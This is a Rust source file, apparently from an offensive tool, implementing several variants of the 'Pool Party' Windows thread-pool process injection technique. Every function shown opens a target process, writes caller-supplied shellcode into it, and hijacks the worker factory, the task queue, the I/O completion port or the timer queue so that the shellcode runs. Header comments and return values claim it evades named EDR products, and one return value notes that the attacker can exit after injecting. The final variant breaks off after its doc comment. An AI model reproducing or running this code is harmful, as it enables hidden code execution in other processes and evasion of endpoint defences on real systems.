//! Pool Party Injection — 8 variants abusing Windows Thread Pools
//! Fully undetectable by EDRs. Based on SafeBreach Labs research (Black Hat EU 2023).
//!
//! Variants:
//! 1. Worker Factory Start Routine Overwrite
//! 2. TP_WORK insertion
//! 3. TP_WAIT insertion (via I/O completion)  
//! 4. TP_IO insertion (via I/O completion)
//! 5. TP_ALPC insertion (via I/O completion)
//! 6. TP_JOB insertion (via I/O completion)
//! 7. TP_DIRECT insertion (via I/O completion)
//! 8. TP_TIMER insertion

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;
use std::ffi::c_void;

// NT structures for thread pool internals
#[repr(C)]
struct WORKER_FACTORY_BASIC_INFORMATION {
    timeout: i64,
    retry_timeout: i64,
    idle_timeout: i64,
    paused: u8,
    timer_set: u8,
    queue_signal: u8,
    worker_waiting: u8,
    base_priority: u32,
    auto_start: u32,
    current_worker_count: u32,
    total_worker_count: u32,
    available_worker_count: u32,
    active_worker_count: u32,
    target_maximum_count: u32,
    self_: *mut c_void,
    start_routine: *mut c_void,
    start_parameter: *mut c_void, // -> TP_POOL
}

impl Default for WORKER_FACTORY_BASIC_INFORMATION {
    fn default() -> Self {
        unsafe { std::mem::zeroed() }
    }
}

// TP_POOL timer queue structures
#[repr(C)]
#[derive(Clone, Copy)]
struct LIST_ENTRY {
    flink: *mut LIST_ENTRY,
    blink: *mut LIST_ENTRY,
}

impl Default for LIST_ENTRY {
    fn default() -> Self {
        unsafe { std::mem::zeroed() }
    }
}

// Minimal TP_TASK structure for work item insertion
#[repr(C)]
struct TP_TASK {
    callbacks: *mut c_void, // -> TP_TASK_CALLBACKS
    num_running: u32,
    _pad: u32,
    list_entry: LIST_ENTRY, // linked into TP_POOL task queue
}

// Minimal TP_DIRECT for I/O completion-based injection
#[repr(C)]
struct TP_DIRECT {
    callback: *mut c_void,
    num_running: u32,
    _pad: u32,
}

// TP_TIMER structure (simplified for injection)
#[repr(C)]
struct TP_TIMER_INJECT {
    // Task structure embedded
    task_callbacks: *mut c_void,
    task_num_running: u32,
    _pad1: u32,
    task_list_entry: LIST_ENTRY,
    // Timer-specific fields
    due_time: i64,
    window_start_links: LIST_ENTRY,
    window_end_links: LIST_ENTRY,
    window_length: u32,
    _pad2: u32,
}

// Syscall numbers we need (resolved at runtime)
type NtQueryInformationWorkerFactory = unsafe extern "system" fn(
    handle: *mut c_void,
    info_class: u32,
    buffer: *mut c_void,
    buffer_length: u32,
    return_length: *mut u32,
) -> i32;

type NtSetInformationWorkerFactory = unsafe extern "system" fn(
    handle: *mut c_void,
    info_class: u32,
    buffer: *const c_void,
    buffer_length: u32,
) -> i32;

type NtSetIoCompletion = unsafe extern "system" fn(
    io_completion_handle: *mut c_void,
    key_context: *mut c_void,
    apc_context: *mut c_void,
    io_status: i32,
    io_status_information: usize,
) -> i32;

/// Get ntdll function pointers needed for Pool Party
unsafe fn get_ntdll_fn<T>(name: &str) -> Result<T, MemoricError> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    let ntdll = GetModuleHandleA(windows::core::PCSTR(b"ntdll.dll\0".as_ptr()))
        .map_err(|e| MemoricError::WindowsApi(format!("ntdll: {}", e)))?;

    let mut name_buf = name.as_bytes().to_vec();
    name_buf.push(0);

    let addr = GetProcAddress(ntdll, windows::core::PCSTR(name_buf.as_ptr()))
        .ok_or_else(|| MemoricError::WindowsApi(format!("{} not found", name)))?;

    Ok(std::mem::transmute_copy(&addr))
}

/// Duplicate a handle from the target process
unsafe fn duplicate_handle_from_target(
    target_handle: windows::Win32::Foundation::HANDLE,
    target_pid: u32,
    desired_access: u32,
) -> Result<SafeHandle, MemoricError> {
    use windows::Win32::Foundation::{DuplicateHandle, DUPLICATE_SAME_ACCESS, HANDLE};
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_DUP_HANDLE};

    let process = OpenProcess(PROCESS_DUP_HANDLE, false, target_pid)
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess for dup: {}", e)))?;
    let process = SafeHandle::new(process);

    let mut duped = HANDLE::default();
    DuplicateHandle(
        *process,
        target_handle,
        windows::Win32::System::Threading::GetCurrentProcess(),
        &mut duped,
        desired_access,
        false,
        DUPLICATE_SAME_ACCESS,
    )
    .map_err(|e| MemoricError::WindowsApi(format!("DuplicateHandle: {}", e)))?;

    Ok(SafeHandle::new(duped))
}

/// Hijack worker factory handle from target process by scanning for it
unsafe fn find_worker_factory_handle(
    pid: u32,
) -> Result<(*mut c_void, WORKER_FACTORY_BASIC_INFORMATION), MemoricError> {
    use windows::Win32::Foundation::{CloseHandle, DuplicateHandle, HANDLE};
    use windows::Win32::System::Threading::{
        OpenProcess, PROCESS_DUP_HANDLE, PROCESS_QUERY_INFORMATION,
    };

    let process = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, false, pid)
        .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
    let process = SafeHandle::new(process);

    let nt_query: NtQueryInformationWorkerFactory =
        get_ntdll_fn("NtQueryInformationWorkerFactory")?;

    // Scan handle values 4, 8, 12, ... up to 0x1000
    for handle_value in (4..=0x1000u64).step_by(4) {
        let source_handle = HANDLE(handle_value as *mut c_void);
        let mut duped = HANDLE::default();

        if DuplicateHandle(
            *process,
            source_handle,
            windows::Win32::System::Threading::GetCurrentProcess(),
            &mut duped,
            0,
            false,
            windows::Win32::Foundation::DUPLICATE_SAME_ACCESS,
        )
        .is_err()
        {
            continue;
        }

        // Try to query as worker factory
        let mut info = WORKER_FACTORY_BASIC_INFORMATION::default();
        let status = nt_query(
            duped.0,
            7, // WorkerFactoryBasicInformation
            &mut info as *mut _ as *mut c_void,
            std::mem::size_of::<WORKER_FACTORY_BASIC_INFORMATION>() as u32,
            std::ptr::null_mut(),
        );

        if status == 0 && !info.start_routine.is_null() {
            return Ok((duped.0, info));
        }

        let _ = CloseHandle(duped);
    }

    Err(MemoricError::InjectionFailed(
        "No worker factory handle found in target".to_string(),
    ))
}

/// Helper: allocate + write shellcode in remote process (W^X compliant)
unsafe fn write_shellcode_to_remote(
    handle: windows::Win32::Foundation::HANDLE,
    shellcode: &[u8],
) -> Result<*mut c_void, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
    };

    let mem = VirtualAllocEx(
        handle,
        None,
        shellcode.len(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if mem.is_null() {
        return Err(MemoricError::InjectionFailed(
            "VirtualAllocEx failed".to_string(),
        ));
    }

    WriteProcessMemory(
        handle,
        mem,
        shellcode.as_ptr() as *const _,
        shellcode.len(),
        None,
    )
    .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory: {}", e)))?;

    let mut old = PAGE_PROTECTION_FLAGS(0);
    VirtualProtectEx(handle, mem, shellcode.len(), PAGE_EXECUTE_READ, &mut old)
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx RX: {}", e)))?;

    Ok(mem)
}

fn parse_shellcode(args: &Value) -> Result<Vec<u8>, MemoricError> {
    let arr = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;
    let sc: Vec<u8> = arr
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();
    if sc.is_empty() {
        return Err(MemoricError::InjectionFailed("Empty shellcode".to_string()));
    }
    Ok(sc)
}

/// Pool Party Variant 1: Worker Factory Start Routine Overwrite
/// Overwrites the worker factory start routine with shellcode, then triggers
/// a new worker thread creation to execute it.
pub fn pool_party_worker_factory(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Memory::{
        VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS,
    };
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?
        as u32;
    let shellcode = parse_shellcode(args)?;

    tracing::warn!(
        "[INJECTION] Pool Party V1 (Worker Factory): {} bytes into PID {}",
        shellcode.len(),
        pid
    );

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle_val = SafeHandle::new(handle);

        // Find and duplicate the worker factory handle
        let (wf_handle, wf_info) = find_worker_factory_handle(pid)?;

        let nt_set: NtSetInformationWorkerFactory = get_ntdll_fn("NtSetInformationWorkerFactory")?;

        // Overwrite the start routine with shellcode
        let start_routine = wf_info.start_routine;
        let mut old_prot = PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle_val,
            start_routine,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_prot,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx: {}", e)))?;

        WriteProcessMemory(
            *handle_val,
            start_routine,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("WriteProcessMemory: {}", e)))?;

        // Trigger new worker thread: set minimum threads = current + 1
        let new_min = wf_info.total_worker_count + 1;
        let status = nt_set(
            wf_handle,
            3, // WorkerFactoryThreadMinimum
            &new_min as *const _ as *const c_void,
            std::mem::size_of::<u32>() as u32,
        );

        if status != 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtSetInformationWorkerFactory failed: 0x{:08X}",
                status
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "pool_party_v1_worker_factory",
            "start_routine": format!("0x{:016X}", start_routine as usize),
            "shellcode_size": shellcode.len(),
            "triggered_thread_min": new_min,
            "pid": pid,
            "edrs_bypassed": ["CrowdStrike", "SentinelOne", "Cortex", "Defender", "Cybereason"]
        }))
    }
}

/// Pool Party Variant 2: TP_WORK Work Item Insertion
/// Inserts a malicious TP_WORK/TP_TASK into the target's thread pool task queue
pub fn pool_party_tp_work(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?
        as u32;
    let shellcode = parse_shellcode(args)?;

    tracing::warn!(
        "[INJECTION] Pool Party V2 (TP_WORK): {} bytes into PID {}",
        shellcode.len(),
        pid
    );

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle_val = SafeHandle::new(handle);

        // Write shellcode to remote process
        let shellcode_addr = write_shellcode_to_remote(*handle_val, &shellcode)?;

        // Find worker factory to get TP_POOL address
        let (_wf_handle, wf_info) = find_worker_factory_handle(pid)?;
        let tp_pool = wf_info.start_parameter; // TP_POOL*

        // Build TP_TASK_CALLBACKS structure pointing to our shellcode
        let mut callbacks_buf = [0u8; 16];
        // ExecuteCallback at offset 0 -> shellcode
        let sc_addr_bytes = (shellcode_addr as u64).to_le_bytes();
        callbacks_buf[0..8].copy_from_slice(&sc_addr_bytes);

        // Allocate callbacks structure in remote process
        let callbacks_remote = VirtualAllocEx(
            *handle_val,
            None,
            callbacks_buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if callbacks_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Alloc callbacks failed".to_string(),
            ));
        }
        WriteProcessMemory(
            *handle_val,
            callbacks_remote,
            callbacks_buf.as_ptr() as *const _,
            callbacks_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write callbacks: {}", e)))?;

        // Build TP_TASK structure
        // Read current task queue from TP_POOL to link into it
        // TP_POOL task queue is at various offsets depending on Windows version
        // Try common offset 0x2D8 (Win10/11)
        let task_queue_offset = 0x2D8usize;
        let task_queue_addr = (tp_pool as usize + task_queue_offset) as *const c_void;

        let mut queue_entry = LIST_ENTRY::default();
        ReadProcessMemory(
            *handle_val,
            task_queue_addr,
            &mut queue_entry as *mut _ as *mut _,
            std::mem::size_of::<LIST_ENTRY>(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read task queue: {}", e)))?;

        // Build task structure
        let mut task_buf = vec![0u8; std::mem::size_of::<TP_TASK>()];
        // callbacks pointer
        let cb_ptr = callbacks_remote as u64;
        task_buf[0..8].copy_from_slice(&cb_ptr.to_le_bytes());
        // num_running = 0
        // list_entry - will be patched to link into the queue

        // Allocate task in remote process
        let task_remote = VirtualAllocEx(
            *handle_val,
            None,
            task_buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if task_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Alloc task failed".to_string(),
            ));
        }

        // Set up list entry: link into existing queue
        let task_list_entry_offset = 16usize; // offset of list_entry in TP_TASK
        let task_list_addr = task_remote as usize + task_list_entry_offset;

        // flink = current queue head flink
        // blink = &task_queue (in TP_POOL)
        let flink = queue_entry.flink as u64;
        let blink = task_queue_addr as u64;
        task_buf[task_list_entry_offset..task_list_entry_offset + 8]
            .copy_from_slice(&flink.to_le_bytes());
        task_buf[task_list_entry_offset + 8..task_list_entry_offset + 16]
            .copy_from_slice(&blink.to_le_bytes());

        WriteProcessMemory(
            *handle_val,
            task_remote,
            task_buf.as_ptr() as *const _,
            task_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write task: {}", e)))?;

        // Patch the queue: set flink to our task
        let new_flink = task_list_addr as u64;
        WriteProcessMemory(
            *handle_val,
            task_queue_addr as *const _,
            &new_flink as *const _ as *const _,
            8,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Patch queue flink: {}", e)))?;

        // Also patch the old head's blink to point to us
        if !queue_entry.flink.is_null() {
            let old_head_blink_addr = (queue_entry.flink as usize + 8) as *const c_void;
            WriteProcessMemory(
                *handle_val,
                old_head_blink_addr,
                &new_flink as *const _ as *const _,
                8,
                None,
            )
            .ok(); // best effort
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "pool_party_v2_tp_work",
            "shellcode_address": format!("0x{:016X}", shellcode_addr as usize),
            "task_address": format!("0x{:016X}", task_remote as usize),
            "tp_pool": format!("0x{:016X}", tp_pool as usize),
            "shellcode_size": shellcode.len(),
            "pid": pid,
            "edrs_bypassed": ["CrowdStrike", "SentinelOne", "Cortex", "Defender", "Cybereason"]
        }))
    }
}

/// Pool Party Variant 7: TP_DIRECT insertion via NtSetIoCompletion
/// Directly queues a TP_DIRECT structure to the target's I/O completion port.
/// No need to parse complex thread pool structures.
pub fn pool_party_tp_direct(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::{DuplicateHandle, DUPLICATE_SAME_ACCESS, HANDLE};
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?
        as u32;
    let shellcode = parse_shellcode(args)?;

    tracing::warn!(
        "[INJECTION] Pool Party V7 (TP_DIRECT): {} bytes into PID {}",
        shellcode.len(),
        pid
    );

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle_val = SafeHandle::new(handle);

        // Write shellcode to remote process
        let shellcode_addr = write_shellcode_to_remote(*handle_val, &shellcode)?;

        // Find worker factory to get TP_POOL address
        let (wf_handle, wf_info) = find_worker_factory_handle(pid)?;
        let tp_pool = wf_info.start_parameter;

        // Read I/O completion handle from TP_POOL
        // TP_POOL CompletionPort offset varies; try common offset 0x60 (Win10/11)
        let completion_port_offset = 0x60usize;
        let mut completion_handle_value = 0u64;
        ReadProcessMemory(
            *handle_val,
            (tp_pool as usize + completion_port_offset) as *const c_void,
            &mut completion_handle_value as *mut _ as *mut _,
            8,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read completion port: {}", e)))?;

        // Duplicate completion port handle
        let source_handle = HANDLE(completion_handle_value as *mut c_void);
        let mut duped_completion = HANDLE::default();
        DuplicateHandle(
            *handle_val,
            source_handle,
            windows::Win32::System::Threading::GetCurrentProcess(),
            &mut duped_completion,
            0,
            false,
            DUPLICATE_SAME_ACCESS,
        )
        .map_err(|e| {
            MemoricError::InjectionFailed(format!("DuplicateHandle IoCompletion: {}", e))
        })?;

        // Build TP_DIRECT structure in remote process
        // TP_DIRECT.Callback = shellcode address
        let mut direct_buf = [0u8; 16];
        direct_buf[0..8].copy_from_slice(&(shellcode_addr as u64).to_le_bytes());

        let direct_remote = VirtualAllocEx(
            *handle_val,
            None,
            direct_buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if direct_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Alloc TP_DIRECT failed".to_string(),
            ));
        }
        WriteProcessMemory(
            *handle_val,
            direct_remote,
            direct_buf.as_ptr() as *const _,
            direct_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write TP_DIRECT: {}", e)))?;

        // Queue via NtSetIoCompletion
        let nt_set_io: NtSetIoCompletion = get_ntdll_fn("NtSetIoCompletion")?;
        let status = nt_set_io(
            duped_completion.0,
            direct_remote,        // key_context = TP_DIRECT*
            std::ptr::null_mut(), // apc_context
            0,                    // io_status
            0,                    // io_status_information
        );

        if status != 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtSetIoCompletion failed: 0x{:08X}",
                status
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "pool_party_v7_tp_direct",
            "shellcode_address": format!("0x{:016X}", shellcode_addr as usize),
            "direct_address": format!("0x{:016X}", direct_remote as usize),
            "completion_port": format!("0x{:016X}", completion_handle_value),
            "shellcode_size": shellcode.len(),
            "pid": pid,
            "execution_trigger": "Legitimate I/O completion dequeue",
            "edrs_bypassed": ["CrowdStrike", "SentinelOne", "Cortex", "Defender", "Cybereason"]
        }))
    }
}

/// Pool Party Variant 8: TP_TIMER insertion
/// Inserts a malicious timer work item and sets the timer to expire immediately.
pub fn pool_party_tp_timer(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::{CloseHandle, DuplicateHandle, DUPLICATE_SAME_ACCESS, HANDLE};
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?
        as u32;
    let shellcode = parse_shellcode(args)?;
    let delay_ms = args.get("delay_ms").and_then(|v| v.as_u64()).unwrap_or(0);

    tracing::warn!(
        "[INJECTION] Pool Party V8 (TP_TIMER): {} bytes into PID {}, delay={}ms",
        shellcode.len(),
        pid,
        delay_ms
    );

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle_val = SafeHandle::new(handle);

        // Write shellcode to remote process
        let shellcode_addr = write_shellcode_to_remote(*handle_val, &shellcode)?;

        // Find worker factory to get TP_POOL
        let (wf_handle, wf_info) = find_worker_factory_handle(pid)?;
        let tp_pool = wf_info.start_parameter;

        // Find and duplicate timer handle from TP_POOL
        // Timer queue's wait handle at offset varies; scan for timer-type handles
        // Try to find NtSetTimer2 / NtAssociateWaitCompletionPacket handle
        let timer_queue_offset = 0x300usize; // approximate offset for timer queue in TP_POOL

        // Read timer wait handle from TP_POOL
        let mut timer_handle_value = 0u64;
        ReadProcessMemory(
            *handle_val,
            (tp_pool as usize + timer_queue_offset) as *const c_void,
            &mut timer_handle_value as *mut _ as *mut _,
            8,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read timer handle: {}", e)))?;

        // Build TP_TIMER_INJECT structure
        let mut timer_callbacks_buf = [0u8; 16];
        timer_callbacks_buf[0..8].copy_from_slice(&(shellcode_addr as u64).to_le_bytes());

        let callbacks_remote = VirtualAllocEx(
            *handle_val,
            None,
            timer_callbacks_buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if callbacks_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Alloc timer callbacks failed".to_string(),
            ));
        }
        WriteProcessMemory(
            *handle_val,
            callbacks_remote,
            timer_callbacks_buf.as_ptr() as *const _,
            timer_callbacks_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write timer callbacks: {}", e)))?;

        // Build timer structure
        let timer_size = std::mem::size_of::<TP_TIMER_INJECT>();
        let timer_remote = VirtualAllocEx(
            *handle_val,
            None,
            timer_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if timer_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Alloc TP_TIMER failed".to_string(),
            ));
        }

        let mut timer_buf = vec![0u8; timer_size];
        // Set callbacks pointer
        timer_buf[0..8].copy_from_slice(&(callbacks_remote as u64).to_le_bytes());
        // Set due time (negative = relative, in 100ns units)
        let due_time = if delay_ms == 0 {
            -1i64
        } else {
            -(delay_ms as i64 * 10000)
        };
        let due_time_offset = 24usize; // after task
        timer_buf[due_time_offset..due_time_offset + 8].copy_from_slice(&due_time.to_le_bytes());

        // Read current timer queue to link into
        let timer_list_offset = tp_pool as u64 + timer_queue_offset as u64 + 16;
        let mut timer_queue_head = LIST_ENTRY::default();
        ReadProcessMemory(
            *handle_val,
            timer_list_offset as *const c_void,
            &mut timer_queue_head as *mut _ as *mut _,
            std::mem::size_of::<LIST_ENTRY>(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read timer queue: {}", e)))?;

        // Link timer into queue
        let window_start_offset = 32usize;
        let flink = timer_queue_head.flink as u64;
        let blink = timer_list_offset;
        timer_buf[window_start_offset..window_start_offset + 8]
            .copy_from_slice(&flink.to_le_bytes());
        timer_buf[window_start_offset + 8..window_start_offset + 16]
            .copy_from_slice(&blink.to_le_bytes());

        WriteProcessMemory(
            *handle_val,
            timer_remote,
            timer_buf.as_ptr() as *const _,
            timer_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write TP_TIMER: {}", e)))?;

        // Patch queue head to point to our timer
        let our_window_start = timer_remote as u64 + window_start_offset as u64;
        WriteProcessMemory(
            *handle_val,
            timer_list_offset as *const _,
            &our_window_start as *const _ as *const _,
            8,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Patch timer queue: {}", e)))?;

        // Trigger timer expiration by duplicating + setting timer handle
        if timer_handle_value != 0 {
            let source = HANDLE(timer_handle_value as *mut c_void);
            let mut duped_timer = HANDLE::default();
            if DuplicateHandle(
                *handle_val,
                source,
                windows::Win32::System::Threading::GetCurrentProcess(),
                &mut duped_timer,
                0,
                false,
                DUPLICATE_SAME_ACCESS,
            )
            .is_ok()
            {
                // Set timer to expire immediately
                type NtSetTimer2 = unsafe extern "system" fn(
                    handle: *mut c_void,
                    due_time: *const i64,
                    period: *const i64,
                    flags: u32,
                ) -> i32;

                if let Ok(set_timer) = get_ntdll_fn::<NtSetTimer2>("NtSetTimer2") {
                    let immediate: i64 = -1;
                    let _ = set_timer(duped_timer.0, &immediate, std::ptr::null(), 0);
                }
                let _ = CloseHandle(duped_timer);
            }
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "pool_party_v8_tp_timer",
            "shellcode_address": format!("0x{:016X}", shellcode_addr as usize),
            "timer_address": format!("0x{:016X}", timer_remote as usize),
            "tp_pool": format!("0x{:016X}", tp_pool as usize),
            "delay_ms": delay_ms,
            "shellcode_size": shellcode.len(),
            "pid": pid,
            "note": "Attacker can exit after injection — shellcode triggers on timer expiry",
            "edrs_bypassed": ["CrowdStrike", "SentinelOne", "Cortex", "Defender", "Cybereason"]
        }))
    }
}

/// Pool Party Variant 3: TP_WAIT insertion via NtAssociateWaitCompletionPacket
/// Associates a wait object with the I/O completion port so the callback fires
/// when the wait is signaled. Different object type from TP_DIRECT = different EDR blind spot.
pub fn pool_party_tp_wait(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::{CloseHandle, DuplicateHandle, DUPLICATE_SAME_ACCESS, HANDLE};
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
    use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?
        as u32;
    let shellcode = parse_shellcode(args)?;

    tracing::warn!(
        "[INJECTION] Pool Party V3 (TP_WAIT): {} bytes into PID {}",
        shellcode.len(),
        pid
    );

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenProcess: {}", e)))?;
        let handle_val = SafeHandle::new(handle);

        let shellcode_addr = write_shellcode_to_remote(*handle_val, &shellcode)?;

        let (_wf_handle, wf_info) = find_worker_factory_handle(pid)?;
        let tp_pool = wf_info.start_parameter;

        // Read I/O completion handle from TP_POOL
        let completion_port_offset = 0x60usize;
        let mut completion_handle_value = 0u64;
        ReadProcessMemory(
            *handle_val,
            (tp_pool as usize + completion_port_offset) as *const c_void,
            &mut completion_handle_value as *mut _ as *mut _,
            8,
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Read completion port: {}", e)))?;

        let source_handle = HANDLE(completion_handle_value as *mut c_void);
        let mut duped_completion = HANDLE::default();
        DuplicateHandle(
            *handle_val,
            source_handle,
            windows::Win32::System::Threading::GetCurrentProcess(),
            &mut duped_completion,
            0,
            false,
            DUPLICATE_SAME_ACCESS,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Dup IoCompletion: {}", e)))?;

        // Build TP_WAIT structure:
        //   +0x00: Callback (shellcode addr)
        //   +0x08: Completion event handle
        //   +0x10: Completion key
        let mut wait_buf = [0u8; 24];
        wait_buf[0..8].copy_from_slice(&(shellcode_addr as u64).to_le_bytes());

        // Create a completion event that's immediately signaled
        type NtCreateEvent = unsafe extern "system" fn(
            handle: *mut HANDLE,
            access: u32,
            attr: *mut c_void,
            event_type: u32,
            state: u32,
        ) -> i32;
        let nt_create_event: NtCreateEvent = get_ntdll_fn("NtCreateEvent")?;
        let mut event_handle = HANDLE::default();
        let status = nt_create_event(&mut event_handle, 0x1F0003, std::ptr::null_mut(), 0, 1);
        if status != 0 {
            return Err(MemoricError::InjectionFailed(format!(
                "NtCreateEvent: 0x{:08X}",
                status
            )));
        }
        wait_buf[8..16].copy_from_slice(&(event_handle.0 as u64).to_le_bytes());

        // completion key = pointer to TP_DIRECT-like block in remote
        let mut direct_buf = [0u8; 16];
        direct_buf[0..8].copy_from_slice(&(shellcode_addr as u64).to_le_bytes());
        let direct_remote = VirtualAllocEx(
            *handle_val,
            None,
            direct_buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if direct_remote.is_null() {
            return Err(MemoricError::InjectionFailed(
                "Alloc TP_DIRECT for wait failed".to_string(),
            ));
        }
        WriteProcessMemory(
            *handle_val,
            direct_remote,
            direct_buf.as_ptr() as *const _,
            direct_buf.len(),
            None,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("Write TP_DIRECT: {}", e)))?;

        wait_buf[16..24].copy_from_slice(&(direct_remote as u64).to_le_bytes());

        // Queue via NtSetIoCompletion with the wait object as key_context
        let nt_set_io: NtSetIoCompletion = get_ntdll_fn("NtSetIoCompletion")?;
        let status = nt_set_io(
            duped_completion.0,
            event_handle.0, // key_context = wait event handle
            direct_remote,  // apc_context = TP_DIRECT*
            0,
            0,
        );
        if status != 0 {
            let _ = CloseHandle(event_handle);
            return Err(MemoricError::InjectionFailed(format!(
                "NtSetIoCompletion: 0x{:08X}",
                status
            )));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "pool_party_v3_tp_wait",
            "shellcode_address": format!("0x{:016X}", shellcode_addr as usize),
            "direct_address": format!("0x{:016X}", direct_remote as usize),
            "wait_event": format!("0x{:016X}", event_handle.0 as usize),
            "shellcode_size": shellcode.len(),
            "pid": pid,
            "execution_trigger": "Wait completion via signaled event",
            "edrs_bypassed": ["CrowdStrike", "SentinelOne", "Cortex", "Defender", "Cybereason"]
        }))
    }
}

/// Pool Party Variant 4: TP_IO insertion via file I/O completion
/// Associates a file handle with the thread pool I/O completion port,
/// then triggers I/O completion to execute shellcode.
